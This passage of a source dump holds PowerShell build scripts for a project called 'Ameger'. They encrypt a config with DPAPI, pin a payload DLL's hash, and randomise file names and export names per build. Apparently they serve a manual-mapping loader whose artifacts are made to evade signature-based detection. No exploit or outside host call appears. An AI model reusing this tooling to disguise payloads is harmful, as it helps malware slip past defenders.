    $mmap = ([BitConverter]::ToUInt32($buf, 0) -bor 1) -band 0xFFFFFFFF
    $rng.GetBytes($buf)
    $str = ([BitConverter]::ToUInt32($buf, 0) -bor 1) -band 0xFFFFFFFF
}
catch {
    Write-Host ("  [x] Error: Seed Generation Failed (RNG Unavailable): " + $_.Exception.Message) -ForegroundColor Red
    exit 1
}
finally {
    if ($null -ne $rng) { $rng.Dispose() }
}

if ($buf.Length -ne 4) {
    Write-Host "  [x] Error: RNG Returned A Short Buffer; Refusing To Build With A Fixed Sentinel." -ForegroundColor Red
    exit 1
}

Write-Output ("AmegerMmapSentinel=0x{0:X8}" -f $mmap)
Write-Output ("AmegerStringSeed=0x{0:X8}" -f $str)
exit 0

```

### Build/Scripts/ProtectConfig.ps1 â€” 211 lines â€” sha12:E0006EE85F42
```powershell
param(
    [Parameter(Mandatory = $true)][string]$Source,
    [Parameter(Mandatory = $true)][string]$Destination,

    [string]$PinPayload,

    [string]$PayloadName,

    [string]$RuntimeName,

    [string]$ExportMap,

    [string]$DllDir,

    [string]$ConfigMagic
)

$ErrorActionPreference = "Stop"
if ([string]::IsNullOrEmpty($ConfigMagic)) {
    foreach ($p in @($Destination, $Source)) {
        if (-not [string]::IsNullOrEmpty($ConfigMagic)) { break }
        if (Test-Path -LiteralPath $p) {
            $probe = [IO.File]::ReadAllBytes($p)
            if ($probe.Length -gt 8) {
                $head = [Text.Encoding]::ASCII.GetString($probe, 0, 8)
                if ($head -match '^[A-Za-z0-9]{8}$') { $ConfigMagic = $head }
            }
        }
    }
    if ([string]::IsNullOrEmpty($ConfigMagic)) {
        Write-Host "ProtectConfig: No Config Magic Supplied And Neither File Carries One; Refusing A Static Fallback"
        exit 1
    }
}
if ($ConfigMagic -notmatch '^[A-Za-z0-9]{8}$') {
    Write-Host "ProtectConfig: Config Magic Must Be 8 ASCII Alphanumerics"
    exit 1
}
$magic = [Text.Encoding]::ASCII.GetBytes($ConfigMagic)

function Read-ConfigText([string]$Path) {
    if (-not (Test-Path -LiteralPath $Path)) { return $null }
    $raw = [IO.File]::ReadAllBytes($Path)
    $enc = $false
    if ($raw.Length -gt $magic.Length) {
        $enc = $true
        for ($i = 0; $i -lt $magic.Length; $i++) {
            if ($raw[$i] -ne $magic[$i]) { $enc = $false; break }
        }
    }
    if ($enc) {
        Add-Type -AssemblyName System.Security | Out-Null
        $blob = New-Object byte[] ($raw.Length - $magic.Length)
        [Array]::Copy($raw, $magic.Length, $blob, 0, $blob.Length)
        $plainBytes = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
        return [Text.Encoding]::UTF8.GetString($plainBytes)
    }
    return [Text.Encoding]::UTF8.GetString($raw)
}

function Get-IniValue([string]$Text, [string]$Key) {
    if ($null -eq $Text) { return $null }
    foreach ($line in [regex]::Split($Text, "\r?\n")) {
        $trimmed = $line.Trim()
        if ($trimmed.Length -eq 0 -or $trimmed.StartsWith(";") -or $trimmed.StartsWith("#")) { continue }
        $eq = $trimmed.IndexOf("=")
        if ($eq -lt 1) { continue }
        if ($trimmed.Substring(0, $eq).Trim() -ieq $Key) { return $trimmed.Substring($eq + 1).Trim() }
    }
    return $null
}

function Set-IniKeys([string]$Text, $Pairs) {
    $order = @("PayloadName", "RuntimeName", "ExportMap", "DllDir")
    $rx = '^\s*(PayloadName|RuntimeName|ExportMap|DllDir)\s*='
    $lines = New-Object System.Collections.Generic.List[string]
    foreach ($line in [regex]::Split($Text, "\r?\n")) {
        if ($line -match $rx) { continue }
        $lines.Add($line)
    }

    $insert = New-Object System.Collections.Generic.List[string]
    foreach ($k in $order) {
        if ($Pairs.ContainsKey($k) -and -not [string]::IsNullOrEmpty($Pairs[$k])) {
            $insert.Add($k + " = " + $Pairs[$k])
        }
    }
    if ($insert.Count -eq 0) { return ($lines -join "`r`n") }

    $anchor = -1
    for ($i = 0; $i -lt $lines.Count; $i++) {
        if ($lines[$i] -match '^\s*PayloadSha256\s*=') { $anchor = $i; break }
    }
    if ($anchor -lt 0) {
        for ($i = 0; $i -lt $lines.Count; $i++) {
            if ($lines[$i].Trim() -ieq "[General]") { $anchor = $i; break }
        }
    }
    if ($anchor -lt 0) {

        $lines.Insert(0, "")
        $lines.Insert(0, "[General]")
        $anchor = 0
    }

    for ($j = 0; $j -lt $insert.Count; $j++) {
        $lines.Insert($anchor + 1 + $j, $insert[$j])
    }
    return ($lines -join "`r`n")
}

if (-not (Test-Path -LiteralPath $Source)) { Write-Host "ProtectConfig: Source Not Found: $Source"; exit 1 }

$pinOverride = $null
if (-not [string]::IsNullOrEmpty($PinPayload)) {
    if (-not (Test-Path -LiteralPath $PinPayload)) {
        Write-Host "ProtectConfig: Pin Payload Not Found: $PinPayload"
        exit 1
    }
    $pinOverride = ([BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([IO.File]::ReadAllBytes($PinPayload))) -replace "-", "")
}

$hasNewKeys = (-not [string]::IsNullOrEmpty($PayloadName)) -or
              (-not [string]::IsNullOrEmpty($RuntimeName)) -or
              (-not [string]::IsNullOrEmpty($ExportMap)) -or
              (-not [string]::IsNullOrEmpty($DllDir))

$existing = [IO.File]::ReadAllBytes($Source)
$isEncrypted = $false
if ($existing.Length -gt $magic.Length) {
    $same = $true
    for ($i = 0; $i -lt $magic.Length; $i++) {
        if ($existing[$i] -ne $magic[$i]) { $same = $false; break }
    }
    $isEncrypted = $same
}
if ($isEncrypted) {
    if ($null -ne $pinOverride) {
        Write-Host "ProtectConfig: Cannot Apply A Pin Override To An Already-Encrypted Source"
        exit 1
    }
    if ($hasNewKeys) {
        Write-Host "ProtectConfig: Cannot Inject Deployment Keys Into An Already-Encrypted Source"
        exit 1
    }
    Write-Host "ProtectConfig: Source Is Already Encrypted; Copying Verbatim."
    Copy-Item -LiteralPath $Source -Destination $Destination -Force
    exit 0
}

$text = [Text.Encoding]::UTF8.GetString($existing)
$modified = $false

if ($null -ne $pinOverride) {
    if ($text -notmatch '(?m)^PayloadSha256\s*=.*$') {
        Write-Host "ProtectConfig: Source Has No PayloadSha256 Line To Override"
        exit 1
    }
    $text = [regex]::Replace($text, '(?m)^PayloadSha256\s*=.*$', 'PayloadSha256 = ' + $pinOverride)
    $modified = $true
    Write-Host ("ProtectConfig: PayloadSha256 = {0}" -f ("" + $pinOverride))
}

$preserved = $null
if ((-not $hasNewKeys) -and (Test-Path -LiteralPath $Destination)) {
    $preserved = Read-ConfigText $Destination
}

$pairs = @{}
if (-not [string]::IsNullOrEmpty($PayloadName)) {
    $pairs["PayloadName"] = $PayloadName
} elseif ($null -ne $preserved) {
    $carry = Get-IniValue $preserved "PayloadName"
    if (-not [string]::IsNullOrEmpty($carry)) { $pairs["PayloadName"] = $carry }
}
if (-not [string]::IsNullOrEmpty($RuntimeName)) {
    $pairs["RuntimeName"] = $RuntimeName
} elseif ($null -ne $preserved) {
    $carry = Get-IniValue $preserved "RuntimeName"
    if (-not [string]::IsNullOrEmpty($carry)) { $pairs["RuntimeName"] = $carry }
}
if (-not [string]::IsNullOrEmpty($ExportMap)) {
    $pairs["ExportMap"] = $ExportMap
} elseif ($null -ne $preserved) {
    $carry = Get-IniValue $preserved "ExportMap"
    if (-not [string]::IsNullOrEmpty($carry)) { $pairs["ExportMap"] = $carry }
}
if (-not [string]::IsNullOrEmpty($DllDir)) {
    $pairs["DllDir"] = $DllDir
} elseif ($null -ne $preserved) {
    $carry = Get-IniValue $preserved "DllDir"
    if (-not [string]::IsNullOrEmpty($carry)) { $pairs["DllDir"] = $carry }
}

if ($pairs.Count -gt 0) {
    $before = $text
    $text = Set-IniKeys $text $pairs
    if ($text -ne $before) { $modified = $true }
    foreach ($k in @("PayloadName", "RuntimeName", "ExportMap", "DllDir")) {
        if ($pairs.ContainsKey($k)) {
            $val = $pairs[$k]
            if ($k -eq "ExportMap") {

                $entries = $val -split ','
                Write-Host ("ProtectConfig: {0} =" -f $k.PadRight(12))
                foreach ($entry in $entries) {
                    $parts = $entry -split '='
                    if ($parts.Count -eq 2) {
                        Write-Host ("  {0} = {1}" -f $parts[0].PadRight(20), ("" + $parts[1]))
                    }
                }
            } else {
                Write-Host ("ProtectConfig: {0} = {1}" -f $k.PadRight(12), ("" + $val))
            }
        }
    }
}

if ($modified) {
    $plain = (New-Object Text.UTF8Encoding($false)).GetBytes($text)
} else {
    $plain = $existing
}

Add-Type -AssemblyName System.Security | Out-Null
try {
    $blob = [Security.Cryptography.ProtectedData]::Protect(
        $plain, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
} catch {
    Write-Host ("ProtectConfig: DPAPI Failed: " + $_.Exception.Message)
    exit 1
}

$out = New-Object byte[] ($magic.Length + $blob.Length)
[Array]::Copy($magic, 0, $out, 0, $magic.Length)
[Array]::Copy($blob, 0, $out, $magic.Length, $blob.Length)
[IO.File]::WriteAllBytes($Destination, $out)

exit 0

```

### Build/Scripts/RepinPayload.ps1 â€” 58 lines â€” sha12:13AA426574F3
```powershell
param(
    [Parameter(Mandatory = $true)][string]$Config,
    [Parameter(Mandatory = $true)][string]$Payload,

    [switch]$Quiet
)

$ErrorActionPreference = "Stop"

if (-not (Test-Path -LiteralPath $Config)) {
    Write-Host ("RepinPayload: Config Not Found: " + $Config)
    exit 1
}
if (-not (Test-Path -LiteralPath $Payload)) {
    Write-Host ("RepinPayload: Payload Asset Not Found: " + $Payload)
    exit 1
}

$hash = ([BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([IO.File]::ReadAllBytes($Payload))) -replace "-", "")
if ([string]::IsNullOrWhiteSpace($hash) -or $hash.Length -ne 64 -or $hash -notmatch '^[0-9A-Fa-f]{64}$') {
    Write-Host "RepinPayload: Payload Did Not Yield A 64-Hex SHA-256 Digest"
    exit 1
}

$text = [Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($Config))

$rx = '(?m)^([ \t]*PayloadSha256[ \t]=).*$'
$count = [regex]::Matches($text, $rx).Count

if ($count -gt 1) {
    Write-Host ("RepinPayload: Found " + $count + " PayloadSha256 Lines; Refusing An Ambiguous Re-Pin")
    exit 1
}

$old = $null
if ($count -eq 1) {
    $line = ([regex]::Match($text, $rx)).Value
    $eq = $line.IndexOf("=")
    $old = $line.Substring($eq + 1).Trim()
    if ($old -ieq $hash) {
        if (-not $Quiet) { Write-Host ("RepinPayload: Pin Already Current (" + $hash + "); No Change") }
        exit 0
    }
    $text = [regex]::Replace($text, $rx, ('$1 ' + $hash), 1)
}
else {

    $lines = [regex]::Split($text, "\r?\n")
    $idx = -1
    for ($i = 0; $i -lt $lines.Count; $i++) {
        if ($lines[$i].Trim() -ieq "[General]") { $idx = $i; break }
    }
    if ($idx -lt 0) {
        Write-Host "RepinPayload: No [General] Section And No PayloadSha256 Line; Refusing To Guess Placement"
        exit 1
    }
    $new = New-Object System.Collections.Generic.List[string]
    for ($i = 0; $i -lt $lines.Count; $i++) {
        $new.Add($lines[$i])
        if ($i -eq $idx) { $new.Add("PayloadSha256 = " + $hash) }
    }
    $text = ($new -join "`r`n")
}

[IO.File]::WriteAllText($Config, $text, (New-Object Text.UTF8Encoding($false)))
Write-Host ("RepinPayload: PayloadSha256 " + $(if ($old) { $old } else { "<absent>" }) + " -> " + $hash)
Write-Host ("RepinPayload: Config Pinned To " + $Payload)
exit 0

```

### Build/Scripts/ShuffleExports.ps1 â€” 219 lines â€” sha12:699BBAAE2622
```powershell
param(
    [Parameter(Mandatory = $true)][string]$Path
)

$ErrorActionPreference = "Stop"

function Write-Diag([string]$Text) {
    [Console]::Error.WriteLine($Text)
}

function Fail([string]$Reason) {
    Write-Output "RENAME_STATUS=failed"
    Write-Diag ("  [x] Export Rename: " + $Reason)
    exit 1
}

if (-not (Test-Path -LiteralPath $Path)) { Fail ("File Not Found: " + $Path) }

$bytes = $null
$read = $false
for ($attempt = 1; $attempt -le 20 -and -not $read; $attempt++) {
    try {
        $bytes = [IO.File]::ReadAllBytes($Path)
        $read = $true
    } catch {
        $chain = $_.Exception
        while ($chain -and -not ($chain -is [System.IO.IOException])) { $chain = $chain.InnerException }
        if ($chain -and $attempt -lt 20) {
            Start-Sleep -Milliseconds 500
        } else {
            Fail ("Read Failed: " + $_.Exception.Message)
        }
    }
}
if (-not $read) { Fail "Read Failed" }

if ($bytes.Length -lt 64 -or $bytes[0] -ne 77 -or $bytes[1] -ne 90) { Fail "Not MZ" }
$e = [BitConverter]::ToInt32($bytes, 0x3C)
if ($e -le 0 -or ($e + 24) -gt $bytes.Length) { Fail "Bad e_lfanew" }
if ([BitConverter]::ToUInt32($bytes, $e) -ne 0x00004550) { Fail "Not PE" }

$coff = $e + 4
$nsec = [BitConverter]::ToUInt16($bytes, $coff + 2)
if ($nsec -le 0 -or $nsec -gt 96) { Fail "Bad Section Count" }
$optSize = [BitConverter]::ToUInt16($bytes, $coff + 16)
$opt = $e + 24
$magic = [BitConverter]::ToUInt16($bytes, $opt)
if ($magic -eq 0x20B) {
    $dd = $opt + 112
} elseif ($magic -eq 0x10B) {
    $dd = $opt + 96
} else {
    Fail "Not PE32/PE32+"
}
$secBase = $opt + $optSize

function Convert-RvaToOffset([byte[]]$Data, [int]$SectionBase, [int]$Count, [uint32]$Rva) {
    for ($i = 0; $i -lt $Count; $i++) {
        $o = $SectionBase + 40 * $i
        $va = [BitConverter]::ToUInt32($Data, $o + 12)
        $vs = [BitConverter]::ToUInt32($Data, $o + 8)
        $ptr = [BitConverter]::ToUInt32($Data, $o + 20)
        $sz = [BitConverter]::ToUInt32($Data, $o + 16)
        $span = [Math]::Max($vs, $sz)
        if ($Rva -ge $va -and $Rva -lt ($va + $span)) { return [int](($Rva - $va) + $ptr) }
    }
    return -1
}

$expRva = [BitConverter]::ToUInt32($bytes, $dd + 0)
$expSz = [BitConverter]::ToUInt32($bytes, $dd + 4)

if ($expRva -eq 0 -or $expSz -lt 40) {
    Write-Output "EXPORT_MAP="
    Write-Output "RENAME_STATUS=ok"
    exit 0
}

$eo = Convert-RvaToOffset $bytes $secBase $nsec $expRva
if ($eo -lt 0 -or ($eo + 40) -gt $bytes.Length) { Fail "Export Directory RVA Unresolved" }

$nFunc = [BitConverter]::ToUInt32($bytes, $eo + 20)
$nNames = [BitConverter]::ToUInt32($bytes, $eo + 24)
$afRva = [BitConverter]::ToUInt32($bytes, $eo + 28)
$anRva = [BitConverter]::ToUInt32($bytes, $eo + 32)
$aoRva = [BitConverter]::ToUInt32($bytes, $eo + 36)

if ($nNames -eq 0) {
    Write-Output "EXPORT_MAP="
    Write-Output "RENAME_STATUS=ok"
    exit 0
}
if ($nNames -gt 4096) { Fail "Implausible Export Name Count" }

$afOff = Convert-RvaToOffset $bytes $secBase $nsec $afRva
$anOff = Convert-RvaToOffset $bytes $secBase $nsec $anRva
$aoOff = Convert-RvaToOffset $bytes $secBase $nsec $aoRva
if ($afOff -lt 0 -or $anOff -lt 0 -or $aoOff -lt 0) { Fail "Export Table RVA Unresolved" }

$entries = New-Object System.Collections.ArrayList
for ($i = 0; $i -lt $nNames; $i++) {
    $nr = [BitConverter]::ToUInt32($bytes, $anOff + 4 * $i)
    $no = Convert-RvaToOffset $bytes $secBase $nsec $nr
    if ($no -lt 0 -or $no -ge $bytes.Length) { Fail "Export Name RVA Unresolved" }
    $len = 0
    while (($no + $len) -lt $bytes.Length -and $bytes[$no + $len] -ne 0) { $len++ }
    if ($len -lt 1) { Fail "Empty Export Name" }
    if (($no + $len) -ge $bytes.Length) { Fail "Unterminated Export Name" }
    $old = [Text.Encoding]::ASCII.GetString($bytes, $no, $len)
    $ord = [BitConverter]::ToUInt16($bytes, $aoOff + 2 * $i)
    [void]$entries.Add([pscustomobject]@{
        Index   = $i
        Offset  = $no
        Length  = $len
        Old     = $old
        Ordinal = $ord
    })
}

$letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
$alnum = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
if ($entries.Count -gt $letters.Length) { Fail "Too Many Exports For The Ordering Scheme" }

$rng = [Security.Cryptography.RandomNumberGenerator]::Create()
try {

    $chosen = New-Object System.Collections.Generic.List[int]
    $oneByte = New-Object byte[] 1
    while ($chosen.Count -lt $entries.Count) {
        $rng.GetBytes($oneByte)
        $idx = [int]($oneByte[0] % $letters.Length)
        if (-not $chosen.Contains($idx)) { [void]$chosen.Add($idx) }
    }
    $sortedIdx = @($chosen | Sort-Object)

    $originals = @{}
    foreach ($ent in $entries) { $originals[$ent.Old.ToLowerInvariant()] = $true }

    $newNames = New-Object System.Collections.ArrayList
    for ($i = 0; $i -lt $entries.Count; $i++) {
        $ent = $entries[$i]
        $first = [char]$letters[$sortedIdx[$i]]
        $tailLen = $ent.Length - 1
        $cand = $null
        for ($attempt = 0; $attempt -lt 256; $attempt++) {
            $tail = New-Object 'char[]' $tailLen
            for ($k = 0; $k -lt $tailLen; $k++) {
                $rng.GetBytes($oneByte)
                $tail[$k] = $alnum[$oneByte[0] % $alnum.Length]
            }
            $try = ([string]$first) + (-join $tail)

            if ($try.ToLowerInvariant().StartsWith("core")) { continue }
            if ($originals.ContainsKey($try.ToLowerInvariant())) { continue }
            $cand = $try
            break
        }
        if ($null -eq $cand) { Fail ("Could Not Synthesize A Replacement For " + $ent.Old) }
        [void]$newNames.Add($cand)
    }

    for ($i = 0; $i -lt $entries.Count; $i++) {
        $ent = $entries[$i]
        $nn = $newNames[$i]
        if ($nn.Length -ne $ent.Length) { Fail "Internal Length Mismatch" }
        $enc = [Text.Encoding]::ASCII.GetBytes($nn)
        [Array]::Copy($enc, 0, $bytes, $ent.Offset, $enc.Length)
        $bytes[$ent.Offset + $ent.Length] = 0
    }
} finally {
    $rng.Dispose()
}

$written = $false
for ($attempt = 1; $attempt -le 20 -and -not $written; $attempt++) {
    try {
        [IO.File]::WriteAllBytes($Path, $bytes)
        $written = $true
    } catch {
        $chain = $_.Exception
        while ($chain -and -not ($chain -is [System.IO.IOException])) { $chain = $chain.InnerException }
        if ($chain -and $attempt -lt 20) {
            Start-Sleep -Milliseconds 500
        } else {
            Fail ("Write Failed: " + $_.Exception.Message)
        }
    }
}
if (-not $written) { Fail "Write Failed" }

$v = [IO.File]::ReadAllBytes($Path)
$ve = [BitConverter]::ToInt32($v, 0x3C)
if ($v.Length -lt 64 -or $v[0] -ne 77 -or $v[1] -ne 90 -or [BitConverter]::ToUInt32($v, $ve) -ne 0x00004550) {
    Fail "Re-Parse: Not A PE After Write"
}
$vcoff = $ve + 4
$vnsec = [BitConverter]::ToUInt16($v, $vcoff + 2)
$voptSize = [BitConverter]::ToUInt16($v, $vcoff + 16)
$vopt = $ve + 24
$vmagic = [BitConverter]::ToUInt16($v, $vopt)
if ($vmagic -eq 0x20B) { $vdd = $vopt + 112 } elseif ($vmagic -eq 0x10B) { $vdd = $vopt + 96 } else { Fail "Re-Parse: Bad Magic" }
$vsecBase = $vopt + $voptSize
$vexpRva = [BitConverter]::ToUInt32($v, $vdd + 0)
$veo = Convert-RvaToOffset $v $vsecBase $vnsec $vexpRva
if ($veo -lt 0) { Fail "Re-Parse: Export Directory RVA Unresolved" }
$vafRva = [BitConverter]::ToUInt32($v, $veo + 28)
$vanRva = [BitConverter]::ToUInt32($v, $veo + 32)
$vaoRva = [BitConverter]::ToUInt32($v, $veo + 36)
$vafOff = Convert-RvaToOffset $v $vsecBase $vnsec $vafRva
$vanOff = Convert-RvaToOffset $v $vsecBase $vnsec $vanRva
$vaoOff = Convert-RvaToOffset $v $vsecBase $vnsec $vaoRva
if ($vafOff -lt 0 -or $vanOff -lt 0 -or $vaoOff -lt 0) { Fail "Re-Parse: Export Table RVA Unresolved" }

$prev = $null
for ($i = 0; $i -lt $entries.Count; $i++) {
    $ent = $entries[$i]
    $nr = [BitConverter]::ToUInt32($v, $vanOff + 4 * $i)
    $no = Convert-RvaToOffset $v $vsecBase $vnsec $nr
    if ($no -lt 0 -or $no -ge $v.Length) { Fail "Re-Parse: Name RVA Unresolved" }
    $len = 0
    while (($no + $len) -lt $v.Length -and $v[$no + $len] -ne 0) { $len++ }
    $got = [Text.Encoding]::ASCII.GetString($v, $no, $len)

    if ($got.ToLowerInvariant().StartsWith("core")) { Fail ("Original-Style Export Name Still Present: " + $got) }
    if ($originals.ContainsKey($got.ToLowerInvariant())) { Fail ("An Original Export Name Survived: " + $got) }

    if ($got -ne $newNames[$i]) { Fail ("Slot " + $i + " Is " + $got + ", Expected " + $newNames[$i]) }

    $vord = [BitConverter]::ToUInt16($v, $vaoOff + 2 * $i)
    if ($vord -ne $ent.Ordinal) { Fail ("Ordinal Index Changed At Slot " + $i) }
    $funcIdx = [int]$vord
    if ($funcIdx -lt 0 -or $funcIdx -ge $nFunc) { Fail ("Ordinal Index " + $vord + " Outside The Function Table") }
    $funcRva = [BitConverter]::ToUInt32($v, $vafOff + 4 * $funcIdx)
    if ($funcRva -eq 0) { Fail ("Name " + $got + " Resolves To A Null Function RVA") }
    if ((Convert-RvaToOffset $v $vsecBase $vnsec $funcRva) -lt 0) { Fail ("Name " + $got + " Resolves Outside Every Section") }

    if ($null -ne $prev -and [string]::CompareOrdinal($prev, $got) -ge 0) {
        Fail ("Name Table Order Broken At Slot " + $i)
    }
    $prev = $got
}

$pairs = New-Object System.Collections.ArrayList
for ($i = 0; $i -lt $entries.Count; $i++) {
    [void]$pairs.Add($entries[$i].Old + "=" + $newNames[$i])
}
Write-Output ("EXPORT_MAP=" + ($pairs -join ','))
Write-Output "RENAME_STATUS=ok"
exit 0

```

### Build/Scripts/ShuffleNaming.ps1 â€” 70 lines â€” sha12:625A97DBECAB
```powershell
param()

$ErrorActionPreference = "Stop"

$script:Letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
$script:Alnum = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

function New-DeployedName($Rng) {

    $buf = New-Object byte[] 1
    $Rng.GetBytes($buf)
    $length = 8 + ($buf[0] % 5)

    $chars = New-Object 'char[]' $length
    $Rng.GetBytes($buf)
    $chars[0] = $script:Letters[$buf[0] % $script:Letters.Length]
    for ($i = 1; $i -lt $length; $i++) {
        $Rng.GetBytes($buf)
        $chars[$i] = $script:Alnum[$buf[0] % $script:Alnum.Length]
    }
    return (-join $chars)
}

try {
    $rng = [Security.Cryptography.RandomNumberGenerator]::Create()
} catch {
    Write-Host ("  [x] Error: Name Generation Failed (RNG Unavailable): " + $_.Exception.Message)
    exit 1
}

try {
    $payload = New-DeployedName $rng
    do { $runtime = New-DeployedName $rng } while ($runtime -eq $payload)
    do { $exe = New-DeployedName $rng } while ($exe -eq $payload -or $exe -eq $runtime)
    do { $dildir = New-DeployedName $rng } while ($dildir -eq $payload -or $dildir -eq $runtime -or $dildir -eq $exe)
    do { $config = New-DeployedName $rng } while ($config -eq $payload -or $config -eq $runtime -or $config -eq $exe -or $config -eq $dildir)
    $mb = New-Object byte[] 8
    $rng.GetBytes($mb)
    $mc = New-Object 'char[]' 8
    $mc[0] = $script:Letters[$mb[0] % $script:Letters.Length]
    for ($k = 1; $k -lt 8; $k++) {
        $mc[$k] = $script:Alnum[$mb[$k] % $script:Alnum.Length]
    }
    $magic = (-join $mc)
} finally {
    $rng.Dispose()
}
if ($magic.Length -ne 8 -or $magic -notmatch '^[A-Za-z][A-Za-z0-9]{7}$') {
    Write-Host "  [x] Error: Generated Config Magic Has Invalid Shape"
    exit 1
}

foreach ($n in @($payload, $runtime, $exe, $dildir, $config, $magic)) {
    if ($n.Length -lt 8 -or $n.Length -gt 12) {
        Write-Host "  [x] Error: Generated Name Has Invalid Length"
        exit 1
    }
    if ($n -notmatch '^[A-Za-z][A-Za-z0-9]+$') {
        Write-Host "  [x] Error: Generated Name Has Invalid Characters"
        exit 1
    }
}
$all = @($payload, $runtime, $exe, $dildir, $config, $magic)
for ($i = 0; $i -lt $all.Count; $i++) {
    for ($j = $i + 1; $j -lt $all.Count; $j++) {
        if ($all[$i] -eq $all[$j]) {
            Write-Host "  [x] Error: Generated Names Collide"
            exit 1
        }
    }
}

Write-Output ("PAYLOAD_NAME=" + $payload + ".dll")
Write-Output ("RUNTIME_NAME=" + $runtime + ".dll")
Write-Output ("EXE_NAME=" + $exe)
Write-Output ("DLLDIR_NAME=" + $dildir)
Write-Output ("CONFIG_NAME=" + $config)
Write-Output ("CONFIG_MAGIC=" + $magic)
exit 0

```

### Build/Scripts/StripExportDirs.ps1 â€” 79 lines â€” sha12:F60C701EA6FC
```powershell
param(
    [Parameter(Mandatory = $true)][string]$Path
)

$ErrorActionPreference = 'Stop'

$noColour = ($env:AMEGER_NO_COLOR -eq '1')
$esc = [string][char]27
if ($noColour) {
    $G = ''; $E = ''; $X = ''
} else {
    $G = "$esc[92m"
    $E = "$esc[91m"
    $X = "$esc[0m"
}

if (-not (Test-Path -LiteralPath $Path)) { Write-Host "  $E[!]$X Export Strip: File Not Found: $Path"; exit 1 }

$b = [IO.File]::ReadAllBytes($Path)
$e = [BitConverter]::ToInt32($b, 0x3C)
if ([Text.Encoding]::ASCII.GetString($b, $e, 4) -ne "PE`0`0") { Write-Host "  $E[!]$X Export Strip: Not A PE"; exit 1 }

$coff = $e + 4
$opt = $coff + 20
$pe32p = ([BitConverter]::ToUInt16($b, $opt) -eq 0x20b)
$ddoff = if ($pe32p) { $opt + 112 } else { $opt + 96 }
$expRva = [BitConverter]::ToUInt32($b, $ddoff + 0)
$expSz = [BitConverter]::ToUInt32($b, $ddoff + 4)

if ($expRva -eq 0 -or $expSz -eq 0) {
    Write-Host "  $G[+]$X Export Directory Already Absent."
    exit 0
}

$secs = @()
$secBase = $opt + [BitConverter]::ToUInt16($b, $coff + 16)
$nsec = [BitConverter]::ToUInt16($b, $coff + 2)
for ($i = 0; $i -lt $nsec; $i++) {
    $o = $secBase + 40 * $i
    $secs += [pscustomobject]@{
        VA = [BitConverter]::ToUInt32($b, $o + 12)
        VS = [BitConverter]::ToUInt32($b, $o + 8)
        Ptr = [BitConverter]::ToUInt32($b, $o + 20)
        Sz = [BitConverter]::ToUInt32($b, $o + 16)
    }
}

function Convert-RvaToOffset([uint32]$rva) {
    foreach ($s in $secs) {
        $span = [Math]::Max($s.VS, $s.Sz)
        if ($rva -ge $s.VA -and $rva -lt ($s.VA + $span)) { return [int](($rva - $s.VA) + $s.Ptr) }
    }
    return -1
}

$eo = Convert-RvaToOffset $expRva
if ($eo -lt 0) { Write-Host "  $E[!]$X Export Strip: Export RVA 0x$($expRva.ToString('X')) Outside Every Section"; exit 1 }

$strings = New-Object System.Collections.Generic.List[int]
$nameRva = [BitConverter]::ToUInt32($b, $eo + 12)
if ($nameRva -ne 0) { $strings.Add((Convert-RvaToOffset $nameRva)) }
$nNames = [BitConverter]::ToUInt32($b, $eo + 24)
$anOff = Convert-RvaToOffset ([BitConverter]::ToUInt32($b, $eo + 32))
if ($nNames -gt 0 -and $anOff -ge 0) {
    if ($nNames -gt 65536) { Write-Host "  $E[!]$X Export Strip: Implausible Name Count $nNames"; exit 1 }
    for ($i = 0; $i -lt $nNames; $i++) {
        $nr = Convert-RvaToOffset ([BitConverter]::ToUInt32($b, $anOff + 4 * $i))
        if ($nr -ge 0) { $strings.Add($nr) }
    }
}

$zeroed = 0
foreach ($o in $strings) {
    if ($o -lt 0 -or $o -ge $b.Length) { continue }
    while ($o -lt $b.Length -and $b[$o] -ne 0) { $b[$o] = 0; $o++; $zeroed++ }
    if ($o -lt $b.Length) { $b[$o] = 0 }
}

$end = [Math]::Min($eo + [int]$expSz, $b.Length)
for ($o = $eo; $o -lt $end; $o++) { $b[$o] = 0 }
for ($o = $ddoff; $o -lt ($ddoff + 8); $o++) { $b[$o] = 0 }

[IO.File]::WriteAllBytes($Path, $b)

$v = [IO.File]::ReadAllBytes($Path)
$ve = [BitConverter]::ToInt32($v, 0x3C)
$vdd = if ($pe32p) { $ve + 4 + 20 + 112 } else { $ve + 4 + 20 + 96 }
$vRva = [BitConverter]::ToUInt32($v, $vdd + 0)
$vSz = [BitConverter]::ToUInt32($v, $vdd + 4)
if ($vRva -ne 0 -or $vSz -ne 0) { Write-Host "  $E[x]$X Export Strip: Data Directory Still Set"; exit 1 }
if ([Text.Encoding]::ASCII.GetString($v).Contains('ManualEntry')) { Write-Host "  $E[x]$X Export Strip: ManualEntry Still Present"; exit 1 }

Write-Host "  $G[+]$X Export Directory Stripped ($G$zeroed$X Name Byte(s) Zeroed, Directory Cleared)."
exit 0

```

### Build/Scripts/VerifyEmbedMagic.ps1 â€” 212 lines â€” sha12:4947B8467484
```powershell
param(
    [Parameter(Mandatory = $true)]
    [ValidateSet("Embed", "Magic", "PayloadHash", "DeployedPin", "ConfigKeys")]
    [string]$Check,

    [Parameter(Mandatory = $true)]
    [string]$Path,

    [string]$Words,

    [string]$Magic,

    [string]$Config,

    [string]$ExpectPin
)

$ErrorActionPreference = "Stop"

$script:UseColor = -not [Console]::IsOutputRedirected
$script:Esc = [char]27
$script:C_Green = "$($script:Esc)[92m"
$script:C_Red = "$($script:Esc)[91m"
$script:C_Dim = "$($script:Esc)[90m"
$script:C_Reset = "$($script:Esc)[0m"

function Get-Painted([string]$Color, [string]$Text) {
    if (-not $script:UseColor) { return $Text }
    return ($Color + $Text + $script:C_Reset)
}

function Write-Ok([string]$Text) {
    Write-Host ("  " + (Get-Painted $script:C_Green "OK") + " " + $Text)
}

function Write-Fail([string]$Text) {
    Write-Host ("  " + (Get-Painted $script:C_Red "[x]") + " " + $Text)
}

if (-not (Test-Path -LiteralPath $Path)) {
    Write-Fail ("Not Found: " + $Path)
